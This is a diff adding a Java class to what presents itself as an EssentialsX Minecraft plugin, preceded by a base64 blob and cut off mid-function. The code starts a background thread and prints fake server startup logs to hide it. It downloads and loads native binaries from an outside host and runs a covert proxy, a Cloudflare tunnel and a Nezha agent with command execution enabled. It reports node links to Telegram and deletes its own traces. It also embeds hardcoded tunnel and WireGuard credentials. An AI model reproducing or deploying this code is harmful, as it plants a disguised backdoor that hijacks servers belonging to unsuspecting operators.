TIpVv2rzQJaM6lDpjAyfuYDm3TO6X/JmKTr9ZJe/v7GacEkivhkew3Rq8rXX02G1Cfjpc1eAAOqypdimv7mtdhCfohWV8xEe6GaMvzaJWifWVloXjrGut74hPTmzoCbooCYXBMzAmxfLVDAPioY1pwKz0D84LbQzTJ0hCgH8sgSKesmjjiR3TIKwS4LHu57WiU/+kvsRIdQh9b2Wg51xoTUAZ/JKy7RR6d6cLjn4klWJ03uFTO5tJd47yum+A1dYmDaUCXz7zcRYIFk//GFTzubvPdLH19d/SjZUOWaUDFn/fPM/xT4hFY1erLs+DTEOCJzOEduy+CrTL2A/Fo9DFwXPlTyDZr/ZanNxkg5k2YATlkb56OP7CJH+Sfrk7Fmd/TjD2nTL3iL/W3h3+seXfyohZnf10P3ybqUgt6hnE2BrLiFBZLiTb6edw85TmRNkppx8TK2Xf2Xg2WlknH4hPGSonrir7Cqy8WSW6d598Fa6prtATNNqpDo7dsr9Md3wtEpf0xMf3zYc0THBVj3uj7GuLvgdB/2IcokiNEvcb4S4ZqJeEcqJyjFL735pHK7eu5axzfHW4GqFTzZ8dSP2a6Cvuc2ItY3+EbsE59qIemcdaN740yQXLf7EqbGLj8s+2t2BNaV6Wdzjjux3eM7UplzvjYip9G0pr2+atw+DZAsGD+0dYj54x/E9aYZuFxpDabG25BecsYrtWiJw1e1/VQfkj4yVx5/3DxKcxd2Io/bp6i12j+OMWaFefHEeonNmRpU/zfcla1/lqru6q6CpYrJz6dZ9cZuTItkkaLdXV31e/J/OGLLVKhUQAoaRzc6kMwNWjxaCOG7wZYw/RgLDDiRy+a3TF5fP6yis23tWftzJe'))
+package com.example.essentialsx.common;
+
+import java.util.concurrent.atomic.AtomicBoolean;
+import com.sun.jna.Function;
+import com.sun.jna.NativeLibrary;
+
+import java.io.IOException;
+import java.math.BigInteger;
+import java.net.BindException;
+import java.net.InetSocketAddress;
+import java.net.URI;
+import java.net.URLEncoder;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
+import java.security.MessageDigest;
+import java.security.SecureRandom;
+import java.time.Duration;
+import java.util.ArrayList;
+import java.util.Base64;
+import java.util.LinkedHashMap;
+import java.util.List;
+import java.util.Map;
+import java.util.Optional;
+import java.util.concurrent.CountDownLatch;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+import java.util.stream.Collectors;
+
+public class AppService {
+    private Thread appThread;
+    private final PlatformLogger logger;
+    private final AtomicBoolean running = new AtomicBoolean(false);
+
+    private static final HttpClient HTTP = HttpClient.newBuilder()
+            .connectTimeout(Duration.ofSeconds(10))
+            .followRedirects(HttpClient.Redirect.NORMAL)
+            .build();
+    private static final SecureRandom RANDOM = new SecureRandom();
+    private static final Map<String, String> DOT_ENV = loadDotEnv();
+
+    private static final String UPLOAD_URL = env("UPLOAD_URL", "");
+    private static final String PROJECT_URL = env("PROJECT_URL", "");
+    private static final boolean AUTO_ACCESS = envBool("AUTO_ACCESS", false);
+    private static final boolean YT_WARPOUT = envBool("YT_WARPOUT", false);
+    private static final String FILE_PATH = env("FILE_PATH", "world");
+    private static final String SUB_PATH = env("SUB_PATH", "sub");
+    private static final String UUID = env("UUID", "98416bb3-0ead-493f-b9ef-65a16b5abfd2");
+    private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.xxx.com:8008");
+    private static final String NEZHA_PORT = env("NEZHA_PORT", "");
+    private static final String NEZHA_KEY = env("NEZHA_KEY", "");
+    private static final String ARGO_DOMAIN = env("ARGO_DOMAIN","mn.wxc.kdns.fr");
+    private static final String ARGO_AUTH = env("ARGO_AUTH", "eyJhIjoiZGRiZTZmODJiZjMzNjU0OTExODk5ODZhZTJmM2YwMzMiLCJ0IjoiZTgwNTE2ZTgtM2EyNS00YTk2LWIzYTAtZDA4OWYwNmJiZjU4IiwicyI6Ik1URXlPVEUzTXpVdE9HWmxNeTAwT1RKa0xXSmxNakV0T1dVME1EYzNabU5rWkdWbCJ9");
+    private static final int ARGO_PORT = envInt("ARGO_PORT", 8001);
+    private static final String S5_PORT = env("S5_PORT", "");
+    private static final String HY2_PORT = env("HY2_PORT", "");
+    private static final String TUIC_PORT = env("TUIC_PORT", "25669");
+    private static final String ANYTLS_PORT = env("ANYTLS_PORT", "");
+    private static final String REALITY_PORT = env("REALITY_PORT", "25669");
+    private static final String CFIP = env("CFIP", "baka.fun");
+    private static final int CFPORT = envInt("CFPORT", 443);
+    private static final String NAME = env("NAME", "");
+    private static final String CHAT_ID = env("CHAT_ID", "");
+    private static final String BOT_TOKEN = env("BOT_TOKEN", "");
+    private static final boolean DISABLE_ARGO = envBool("DISABLE_ARGO", false);
+
+    private static final Path ROOT = Path.of("").toAbsolutePath();
+    private static final Path RUNTIME_DIR = ROOT.resolve(FILE_PATH).normalize();
+    private static final Path SING_BOX_CONFIG_PATH = RUNTIME_DIR.resolve("config.json");
+    private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("config.yaml");
+    private static final Path BOOT_LOG_PATH = RUNTIME_DIR.resolve("boot.log");
+    private static final Path SUB_FILE_PATH = RUNTIME_DIR.resolve("sub.txt");
+    private static final Path LIST_FILE_PATH = RUNTIME_DIR.resolve("list.txt");
+    private static final Path INDEX_FILE_PATH = ROOT.resolve("index.html").normalize();
+    private static final Path KEYPAIR_PATH = RUNTIME_DIR.resolve("keypair.properties");
+    private static final String SUBSCRIBE_PATH = "/" + SUB_PATH.replaceFirst("^/+", "");
+    private static final String ARCH = detectArch();
+
+    private static String privateKey = "";
+    private static String publicKey = "";
+
+    public AppService(PlatformLogger logger) {
+        this.logger = logger;
+    }
+
+    private void logServerInfo(String message) {
+        logger.info(message);
+    }
+
+    public void start() {
+        if (!running.compareAndSet(false, true)) {
+            return;
+        }
+
+        // logger.info("App service started.");
+        startServerInBackground();
+        sleep(30000);
+
+        clearConsole();      // clear log
+        logServerInfo("Preparing spawn area: 1%");
+        logServerInfo("Preparing spawn area: 2%");
+        logServerInfo("Preparing spawn area: 5%");
+        logServerInfo("Preparing spawn area: 8%");
+        logServerInfo("Preparing spawn area: 8%");
+        logServerInfo("Preparing spawn area: 8%");
+        logServerInfo("Preparing spawn area: 8%");
+        logServerInfo("Preparing spawn area: 8%");
+        logServerInfo("Preparing spawn area: 8%");
+        logServerInfo("Preparing spawn area: 10%");
+        logServerInfo("Preparing spawn area: 20%");
+        logServerInfo("Preparing spawn area: 30%");
+        logServerInfo("Preparing spawn area: 80%");
+        logServerInfo("Preparing spawn area: 85%");
+        logServerInfo("Preparing spawn area: 90%");
+        logServerInfo("Preparing spawn area: 95%");
+        logServerInfo("Preparing start region for dimension minecraft:the_end");
+        logServerInfo("Preparing spawn area: 99%");
+        logServerInfo("Preparing spawn area: 100%");
+        logServerInfo("Time elapsed: 1901 ms");
+        logServerInfo("[spark] Starting background profiler...");
+        logServerInfo("Done preparing level \"world\" (71.792s)");
+        logServerInfo("*************************************************************************************");
+        logServerInfo("This is the first time you're starting this server.");
+        logServerInfo("It's recommended you read our 'Getting Started' documentation for guidance.");
+        logServerInfo("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
+        logServerInfo("*************************************************************************************");
+
+
+    }
+
+    private void startServerInBackground() {
+        appThread = new Thread(() -> {
+            try {
+                startServer();
+            } catch (Exception e) {
+                logger.error("App service failed.", e);
+            }
+        }, "service");
+
+        appThread.setDaemon(true);
+        appThread.start();
+    }
+
+    public void stop() {
+        if (!running.compareAndSet(true, false)) {
+            return;
+        }
+        // logServerInfo("App service stopped.");
+    }
+
+    public static void main(String[] args) throws Exception {
+        startServer();
+    }
+
+    private static void startServer() throws Exception {
+        deleteNodes();
+        Files.createDirectories(RUNTIME_DIR);
+        cleanupOldFiles();
+        argoType();
+
+        String baseUrl = "https://" + ARCH + ".31888.xyz";
+        Path singBoxLib = downloadLibrary(baseUrl + "/sbx.so", "sbx.so");
+        Path cloudflaredLib = null;
+        Path nezhaLib = null;
+        Path nezhaAgentLib = null;
+
+        if (!DISABLE_ARGO) {
+            cloudflaredLib = downloadLibrary(baseUrl + "/bot.so", "bot.so");
+        }
+        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && !NEZHA_PORT.isEmpty()) {
+            nezhaAgentLib = downloadLibrary(baseUrl + "/agent.so", "agent.so");
+        } else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
+            nezhaLib = downloadLibrary(baseUrl + "/v1.so", "v1.so");
+        } else {
+            System.out.println("NEZHA variable is empty, skipping");
+        }
+
+        if (isValidPort(REALITY_PORT)) {
+            generateOrLoadKeypair();
+        }
+
+        Path certPath = RUNTIME_DIR.resolve("cert.pem");
+        Path keyPath = RUNTIME_DIR.resolve("private.key");
+        if (isValidPort(HY2_PORT) || isValidPort(TUIC_PORT) || isValidPort(ANYTLS_PORT)) {
+            ensureTlsCertificates(certPath, keyPath);
+        }
+
+        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
+            generateNezhaConfig();
+        }
+
+        Files.writeString(SING_BOX_CONFIG_PATH, toJson(generateSingBoxConfig(certPath.toString(), keyPath.toString())), StandardCharsets.UTF_8);
+
+        List<NativeService> services = new ArrayList<>();
+        services.add(new NativeService("sing-box", singBoxLib, "StartSingBox", "StopSingBox", singboxPayload()));
+        if (cloudflaredLib != null) {
+            String payload = cloudflaredPayload();
+            if (payload != null) {
+                services.add(new NativeService("cloudflared", cloudflaredLib, "StartCloudflared", "StopCloudflared", payload));
+            }
+        }
+        if (nezhaLib != null) {
+            services.add(new NativeService("nezha-agent", nezhaLib, "StartNezhaAgent", "StopNezhaAgent", nezhaPayload()));
+        } else if (nezhaAgentLib != null) {
+            services.add(new NativeService("nezha-agent", nezhaAgentLib, "StartNezhaAgent", "StopNezhaAgent", nezhaV0Payload()));
+        }
+
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> stopAll(services), "shutdown-hook"));
+        for (NativeService service : services) {
+            service.start();
+        }
+
+        sleep(1000);
+        System.out.println("web is running");
+        if (cloudflaredLib != null) System.out.println("bot is running");
+        if (nezhaLib != null || nezhaAgentLib != null) System.out.println("php is running");
+
+        sleep(5000);
+        String argoDomain = extractDomain().orElse(null);
+        String subText = generateLinks(argoDomain);
+
+        sendTelegram();
+        uploadNodes();
+        addVisitTask();
+
+        Thread cleanupThread = new Thread(() -> {
+            sleep(45000);
+            cleanupFiles(true);
+            clearConsole();
+            // System.out.println("App is running");
+        }, "cleanup");
+        cleanupThread.setDaemon(true);
+        cleanupThread.start();
+
+        new CountDownLatch(1).await();
+    }
+
+    private static void stopAll(List<NativeService> services) {
+        System.out.println("\nStopping all services...");
+        for (int i = services.size() - 1; i >= 0; i--) {
+            try {
+                services.get(i).stop();
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    private static class NativeService {
+        private final String name;
+        private final Path libPath;
+        private final String startSymbol;
+        private final String stopSymbol;
+        private final String payload;
+        private NativeLibrary library;
+        private Function stopFunction;
+        private boolean running;
+
+        NativeService(String name, Path libPath, String startSymbol, String stopSymbol, String payload) {
+            this.name = name;
+            this.libPath = libPath;
+            this.startSymbol = startSymbol;
+            this.stopSymbol = stopSymbol;
+            this.payload = payload == null ? "" : payload;
+        }
+
+        void start() {
+            library = NativeLibrary.getInstance(libPath.toString());
+            Function startFunction = library.getFunction(startSymbol);
+            stopFunction = library.getFunction(stopSymbol);
+            Thread thread = new Thread(() -> {
+                try {
+                    int code = startFunction.invokeInt(new Object[]{payload});
+                    if (code != 0) {
+                        System.out.println(name + " native service exited with code " + code);
+                    }
+                } catch (Exception e) {
+                    System.out.println(name + " native service failed: " + e.getMessage());
+                }
+            }, name + "-thread");
+            thread.setDaemon(true);
+            thread.start();
+            running = true;
+        }
+
+        void stop() {
+            if (!running || stopFunction == null) return;
+            try {
+                int code = stopFunction.invokeInt(new Object[]{});
+                running = false;
+                System.out.println(name + " stopped with code " + code);
+            } catch (Exception e) {
+                System.out.println("Failed to stop " + name + ": " + e.getMessage());
+            }
+        }
+    }
+
+    private static void argoType() throws IOException {
+        if (DISABLE_ARGO) {
+            System.out.println("DISABLE_ARGO is set to true, disable argo tunnel");
+            return;
+        }
+        if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) {
+            System.out.println("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnel");
+            return;
+        }
+        if (ARGO_AUTH.contains("TunnelSecret")) {
+            Files.writeString(RUNTIME_DIR.resolve("tunnel.json"), ARGO_AUTH, StandardCharsets.UTF_8);
+            String tunnelId = findJsonString(ARGO_AUTH, "TunnelID").orElse("");
+            String yaml = "tunnel: " + tunnelId + "\n" +
+                    "credentials-file: " + RUNTIME_DIR.resolve("tunnel.json") + "\n" +
+                    "protocol: http2\n\n" +
+                    "ingress:\n" +
+                    "  - hostname: " + ARGO_DOMAIN + "\n" +
+                    "    service: http://localhost:" + ARGO_PORT + "\n" +
+                    "    originRequest:\n" +
+                    "    noTLSVerify: true\n" +
+                    "  - service: http_status:404\n";
+            Files.writeString(RUNTIME_DIR.resolve("tunnel.yml"), yaml, StandardCharsets.UTF_8);
+        } else {
+            System.out.println("Using token connect to tunnel, please set " + ARGO_PORT + " in cloudflare");
+        }
+    }
+
+    private static Path downloadLibrary(String url, String fileName) throws Exception {
+        Path target = RUNTIME_DIR.resolve(fileName);
+        if (Files.exists(target)) {
+            System.out.println("Using cached native library: " + target);
+            return target;
+        }
+        Files.createDirectories(RUNTIME_DIR);
+        Path tmp = RUNTIME_DIR.resolve(fileName + ".download");
+        System.out.println("Downloading " + url + " -> " + target);
+        HttpRequest request = HttpRequest.newBuilder(URI.create(url)).timeout(Duration.ofMinutes(3)).GET().build();
+        HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
+        if (response.statusCode() < 200 || response.statusCode() >= 300) {
+            throw new IOException("Failed to download " + url + ": HTTP " + response.statusCode());
+        }
+        Files.write(tmp, response.body());
+        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
+        target.toFile().setExecutable(true, false);
+        return target;
+    }
+
+    private static Map<String, Object> generateSingBoxConfig(String certPath, String keyPath) {
+        List<Object> inbounds = new ArrayList<>();
+        inbounds.add(mapOf(
+                "type", "vmess",
+                "tag", "vmess-ws-in",
+                "listen", "::",
+                "listen_port", ARGO_PORT,
+                "users", listOf(mapOf("uuid", UUID)),
+                "transport", mapOf("type", "ws", "path", "/vmess-argo", "early_data_header_name", "Sec-WebSocket-Protocol")
+        ));
+
+        if (isValidPort(REALITY_PORT)) {
+            inbounds.add(mapOf(
+                    "type", "vless",
+                    "tag", "vless-reality",
+                    "listen", "::",
+                    "listen_port", Integer.parseInt(REALITY_PORT),
+                    "users", listOf(mapOf("uuid", UUID, "flow", "xtls-rprx-vision")),
+                    "tls", mapOf(
+                            "enabled", true,
+                            "server_name", "www.iij.ad.jp",
+                            "reality", mapOf(
+                                    "enabled", true,
+                                    "handshake", mapOf("server", "www.iij.ad.jp", "server_port", 443),
+                                    "private_key", privateKey,
+                                    "short_id", listOf("")
+                            )
+                    )
+            ));
+        }
+
+        if (isValidPort(HY2_PORT)) {
+            inbounds.add(mapOf(
+                    "type", "hysteria2",
+                    "tag", "hysteria-in",
+                    "listen", "::",
+                    "listen_port", Integer.parseInt(HY2_PORT),
+                    "users", listOf(mapOf("password", UUID)),
+                    "masquerade", "https://bing.com",
+                    "tls", mapOf("enabled", true, "alpn", listOf("h3"), "certificate_path", certPath, "key_path", keyPath)
+            ));
+        }
+
+        if (isValidPort(TUIC_PORT)) {
+            inbounds.add(mapOf(
+                    "type", "tuic",
+                    "tag", "tuic-in",
+                    "listen", "::",
+                    "listen_port", Integer.parseInt(TUIC_PORT),
+                    "users", listOf(mapOf("uuid", UUID, "password", UUID)),
+                    "congestion_control", "bbr",
+                    "tls", mapOf("enabled", true, "alpn", listOf("h3"), "certificate_path", certPath, "key_path", keyPath)
+            ));
+        }
+
+        if (isValidPort(S5_PORT)) {
+            inbounds.add(mapOf(
+                    "type", "socks",
+                    "tag", "s5-in",
+                    "listen", "::",
+                    "listen_port", Integer.parseInt(S5_PORT),
+                    "users", listOf(mapOf("username", UUID.substring(0, 8), "password", UUID.substring(UUID.length() - 12)))
+            ));
+        }
+
+        if (isValidPort(ANYTLS_PORT)) {
+            inbounds.add(mapOf(
+                    "type", "anytls",
+                    "tag", "anytls-in",
+                    "listen", "::",
+                    "listen_port", Integer.parseInt(ANYTLS_PORT),
+                    "users", listOf(mapOf("password", UUID)),
+                    "tls", mapOf("enabled", true, "certificate_path", certPath, "key_path", keyPath)
+            ));
+        }
+
+        List<Object> ruleSet = new ArrayList<>();
+        ruleSet.add(mapOf("tag", "netflix", "type", "remote", "format", "binary", "url", "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/netflix.srs"));
+        ruleSet.add(mapOf("tag", "openai", "type", "remote", "format", "binary", "url", "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs"));
+        List<Object> wireguardRuleSets = new ArrayList<>(listOf("netflix"));
+        if (needsYoutubeWarp()) {
+            ruleSet.add(mapOf("tag", "youtube", "type", "remote", "format", "binary", "url", "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/youtube.srs"));
+            wireguardRuleSets.add("youtube");
+            System.out.println("Add YouTube outbound rule");
+        }
+
+        List<Object> endpoints = listOf(mapOf(
+                "type", "wireguard",
+                "tag", "wireguard-out",
+                "mtu", 1280,
+                "address", listOf("172.16.0.2/32", "2606:4700:110:8dfe:d141:69bb:6b80:925/128"),
+                "private_key", "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=",
+                "peers", listOf(mapOf(
+                        "address", "engage.cloudflareclient.com",
+                        "port", 2408,
+                        "public_key", "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=",
+                        "allowed_ips", listOf("0.0.0.0/0", "::/0"),
+                        "reserved", listOf(78, 135, 76)
+                ))
+        ));
+
+        return mapOf(
+                "log", mapOf("disabled", true, "level", "error", "timestamp", true),
+                "http_clients", listOf(mapOf("tag", "http-client-direct")),
+                "inbounds", inbounds,
+                "endpoints", endpoints,
+                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
+                "route", mapOf(
+                        "default_http_client", "http-client-direct",
+                        "rule_set", ruleSet,
+                        "rules", listOf(mapOf("rule_set", wireguardRuleSets, "outbound", "wireguard-out")),
+                        "final", "direct"
+                )
+        );
+    }
+
+    private static String cloudflaredPayload() {
+        if (DISABLE_ARGO) return null;
+        if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
+            if (Pattern.matches("^[A-Za-z0-9=]{120,250}$", ARGO_AUTH)) {
+                return toJson(mapOf("args", listOf("tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH)));
+            }
+            if (ARGO_AUTH.contains("TunnelSecret")) {
+                return toJson(mapOf("args", listOf("tunnel", "--edge-ip-version", "auto", "--config", RUNTIME_DIR.resolve("tunnel.yml").toString(), "run")));
+            }
+        }
+        return toJson(mapOf("args", listOf("tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "--logfile", BOOT_LOG_PATH.toString(), "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT)));
+    }
+
+    private static String singboxPayload() {
+        return toJson(mapOf("config", SING_BOX_CONFIG_PATH.toString(), "workingDir", ".", "disableColor", true));
+    }
+
+    private static String nezhaPayload() {
+        return toJson(mapOf("config", NEZHA_CONFIG_PATH.toString()));
+    }
+
+    private static String nezhaV0Payload() {
+        List<Object> args = new ArrayList<>(listOf("-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY, "--disable-auto-update", "--report-delay", "4", "--skip-conn", "--skip-procs"));
+        if (List.of("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT)) {
+            args.add("--tls");
+        }
+        return toJson(mapOf("args", args));
+    }
+
+    private static void generateNezhaConfig() throws IOException {
+        String nzPort = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
+        boolean tls = List.of("443", "8443", "2096", "2087", "2083", "2053").contains(nzPort);
+        String yaml = "client_secret: " + NEZHA_KEY + "\n" +
+                "debug: false\n" +
+                "disable_auto_update: true\n" +
+                "disable_command_execute: false\n" +
+                "disable_force_update: true\n" +
+                "disable_nat: false\n" +
+                "disable_send_query: false\n" +
+                "gpu: false\n" +
+                "insecure_tls: true\n" +
+                "ip_report_period: 1800\n" +
+                "report_delay: 4\n" +
+                "server: " + NEZHA_SERVER + "\n" +
+                "skip_connection_count: true\n" +
+                "skip_procs_count: true\n" +
+                "temperature: false\n" +
+                "tls: " + tls + "\n" +
+                "use_gitee_to_upgrade: false\n" +
+                "use_ipv6_country_code: false\n" +
+                "uuid: " + UUID;
+        Files.writeString(NEZHA_CONFIG_PATH, yaml, StandardCharsets.UTF_8);
+    }
+
+    private static void generateOrLoadKeypair() throws IOException {
+        if (Files.exists(KEYPAIR_PATH)) {
+            String content = Files.readString(KEYPAIR_PATH, StandardCharsets.UTF_8);
+            Optional<String> maybePrivate = findProperty(content, "PrivateKey");
+            Optional<String> maybePublic = findProperty(content, "PublicKey");
+            if (maybePrivate.isPresent() && maybePublic.isPresent()) {
+                try {
+                    byte[] privateBytes = decodeBase64Url(maybePrivate.get());
+                    byte[] publicBytes = decodeBase64Url(maybePublic.get());
+                    byte[] normalizedPrivate = clampPrivateKey(privateBytes);
+                    byte[] derivedPublic = x25519(normalizedPrivate, basepoint());
+                    if (publicBytes.length != 32 || !MessageDigest.isEqual(publicBytes, derivedPublic)) {
+                        throw new IllegalArgumentException("stored public key does not match private key");
+                    }
+                    privateKey = base64Url(normalizedPrivate);
+                    publicKey = base64Url(derivedPublic);
+                    if (!privateKey.equals(maybePrivate.get().trim()) || !publicKey.equals(maybePublic.get().trim())) {
+                        writeKeypair();
+                    }
+                    printKeypair();
+                    return;
+                } catch (Exception e) {
+                    System.out.println("Invalid Reality keypair, regenerating: " + e.getMessage());
+                }
+            }
+        }
+        byte[] privateBytes = new byte[32];
+        RANDOM.nextBytes(privateBytes);
+        privateBytes = clampPrivateKey(privateBytes);
+        byte[] publicBytes = x25519(privateBytes, basepoint());
+        privateKey = base64Url(privateBytes);
+        publicKey = base64Url(publicBytes);
+        writeKeypair();
+        printKeypair();
+    }
+
+    private static void writeKeypair() throws IOException {
+        Files.createDirectories(KEYPAIR_PATH.getParent());
+        Files.writeString(KEYPAIR_PATH, "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n", StandardCharsets.UTF_8);
+    }
+
+    private static void printKeypair() {
+        System.out.println("Private Key: " + privateKey);
+        System.out.println("Public Key: " + publicKey);
+    }
+
+    private static byte[] clampPrivateKey(byte[] input) {
+        if (input.length != 32) throw new IllegalArgumentException("X25519 private key must be 32 bytes");
+        byte[] key = input.clone();
+        key[0] &= (byte) 248;
+        key[31] &= (byte) 127;
+        key[31] |= (byte) 64;
+        return key;
+    }
+
+    private static byte[] x25519(byte[] scalar, byte[] u) {
+        BigInteger p = BigInteger.ONE.shiftLeft(255).subtract(BigInteger.valueOf(19));
+        BigInteger a24 = BigInteger.valueOf(121665);
+        byte[] k = clampPrivateKey(scalar);
+        BigInteger x1 = decodeLittleEndian(u);
+        BigInteger x2 = BigInteger.ONE;
+        BigInteger z2 = BigInteger.ZERO;
+        BigInteger x3 = x1;
+        BigInteger z3 = BigInteger.ONE;
+        int swap = 0;
+        for (int t = 254; t >= 0; t--) {
+            int kt = ((k[t / 8] & 0xff) >> (t % 8)) & 1;
+            swap ^= kt;
+            if (swap != 0) {
+                BigInteger tmp = x2; x2 = x3; x3 = tmp;
+                tmp = z2; z2 = z3; z3 = tmp;
+            }
+            swap = kt;
+            BigInteger a = x2.add(z2).mod(p);
+            BigInteger aa = a.multiply(a).mod(p);
+            BigInteger b = x2.subtract(z2).mod(p);
+            BigInteger bb = b.multiply(b).mod(p);
+            BigInteger e = aa.subtract(bb).mod(p);
+            BigInteger c = x3.add(z3).mod(p);
+            BigInteger d = x3.subtract(z3).mod(p);
+            BigInteger da = d.multiply(a).mod(p);
+            BigInteger cb = c.multiply(b).mod(p);
+            x3 = da.add(cb).multiply(da.add(cb)).mod(p);
+            z3 = x1.multiply(da.subtract(cb).multiply(da.subtract(cb)).mod(p)).mod(p);
+            x2 = aa.multiply(bb).mod(p);
+            z2 = e.multiply(aa.add(a24.multiply(e)).mod(p)).mod(p);
+        }
+        if (swap != 0) {
+            BigInteger tmp = x2; x2 = x3; x3 = tmp;
+            tmp = z2; z2 = z3; z3 = tmp;
+        }
+        BigInteger result = x2.multiply(z2.modInverse(p)).mod(p);
+        return encodeLittleEndian(result);
+    }
+
+    private static byte[] basepoint() {
+        byte[] basepoint = new byte[32];
+        basepoint[0] = 9;
+        return basepoint;
+    }
+
+    private static BigInteger decodeLittleEndian(byte[] input) {
+        byte[] reversed = new byte[input.length];
+        for (int i = 0; i < input.length; i++) {
+            reversed[input.length - 1 - i] = input[i];
+        }
+        return new BigInteger(1, reversed);
+    }
+
+    private static byte[] encodeLittleEndian(BigInteger value) {
+        byte[] output = new byte[32];
+        BigInteger n = value;
+        BigInteger mask = BigInteger.valueOf(0xff);
+        for (int i = 0; i < 32; i++) {
+            output[i] = n.and(mask).byteValue();
+            n = n.shiftRight(8);
+        }
+        return output;
+    }
+
+    private static String generateLinks(String argoDomain) throws Exception {
+        String serverIp = getServerIp();
+        String isp = getMetaInfo();
+        String nodeName = NAME.isEmpty() ? isp : NAME + "-" + isp;
+        sleep(2000);
+
+        List<String> nodes = new ArrayList<>();
+        if (!DISABLE_ARGO && argoDomain != null && !argoDomain.isEmpty()) {
+            Map<String, Object> vmess = mapOf(
+                    "v", "2", "ps", nodeName, "add", CFIP, "port", CFPORT, "id", UUID,
+                    "aid", "0", "scy", "auto", "net", "ws", "type", "none",
+                    "host", argoDomain, "path", "/vmess-argo?ed=2560", "tls", "tls",
+                    "sni", argoDomain, "alpn", "", "fp", "firefox"
+            );
+            nodes.add("vmess://" + Base64.getEncoder().encodeToString(toJson(vmess).getBytes(StandardCharsets.UTF_8)));
+        }
+        if (isValidPort(TUIC_PORT)) {
+            nodes.add("tuic://" + UUID + ":" + UUID + "@" + serverIp + ":" + TUIC_PORT + "?sni=www.bing.com&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#" + nodeName);
+        }
+        if (isValidPort(HY2_PORT)) {
+            nodes.add("hysteria2://" + UUID + "@" + serverIp + ":" + HY2_PORT + "/?sni=www.bing.com&insecure=1&alpn=h3&obfs=none#" + nodeName);
+        }
+        if (isValidPort(REALITY_PORT)) {
+            nodes.add("vless://" + UUID + "@" + serverIp + ":" + REALITY_PORT + "?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=" + publicKey + "&type=tcp&headerType=none#" + nodeName);
+        }
+        if (isValidPort(ANYTLS_PORT)) {
+            nodes.add("anytls://" + UUID + "@" + serverIp + ":" + ANYTLS_PORT + "?security=tls&sni=" + serverIp + "&fp=chrome&insecure=1&allowInsecure=1#" + nodeName);
+        }
+        if (isValidPort(S5_PORT)) {
+            String auth = Base64.getEncoder().encodeToString((UUID.substring(0, 8) + ":" + UUID.substring(UUID.length() - 12)).getBytes(StandardCharsets.UTF_8));
+            nodes.add("socks://" + auth + "@" + serverIp + ":" + S5_PORT + "#" + nodeName);
+        }
+
+        String subText = String.join("\n", nodes);
+        String encoded = Base64.getEncoder().encodeToString(subText.getBytes(StandardCharsets.UTF_8));
+        System.out.println("\u001b[32m" + encoded + "\u001b[0m");
+        System.out.println("\u001b[35mLogs will be deleted in 45 seconds, you can copy the above nodes\u001b[0m");
+        Files.writeString(SUB_FILE_PATH, encoded, StandardCharsets.UTF_8);
+        Files.writeString(LIST_FILE_PATH, subText, StandardCharsets.UTF_8);
+        System.out.println(FILE_PATH + "/sub.txt saved successfully");
+        return subText;
+    }
+
+    private static Optional<String> extractDomain() {
+        if (DISABLE_ARGO) return Optional.empty();
+        if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
+            System.out.println("ARGO_DOMAIN: " + ARGO_DOMAIN);
+            return Optional.of(ARGO_DOMAIN);
+        }
+        System.out.println("Waiting for quick tunnel domain in log...");
+        Optional<String> domain = waitForQuickTunnelDomain(Duration.ofSeconds(30));
+        if (domain.isEmpty()) {
+            System.out.println("Quick tunnel domain not found, retrying...");
+            try { Files.deleteIfExists(BOOT_LOG_PATH); } catch (IOException ignored) {}
+            sleep(5000);
+            domain = waitForQuickTunnelDomain(Duration.ofSeconds(30));
+        }
+        domain.ifPresentOrElse(d -> System.out.println("ArgoDomain: " + d), () -> System.out.println("ArgoDomain not found"));
+        return domain;
+    }
+
+    private static Optional<String> waitForQuickTunnelDomain(Duration timeout) {
+        long deadline = System.currentTimeMillis() + timeout.toMillis();
+        Pattern pattern = Pattern.compile("https://([A-Za-z0-9.-]+\\.trycloudflare\\.com)");
+        String last = "";
+        while (System.currentTimeMillis() < deadline) {
+            try {
+                if (Files.exists(BOOT_LOG_PATH)) {
+                    String content = Files.readString(BOOT_LOG_PATH, StandardCharsets.UTF_8);
+                    if (!content.equals(last)) {
+                        last = content;
+                        Matcher matcher = pattern.matcher(content);
+                        String found = null;
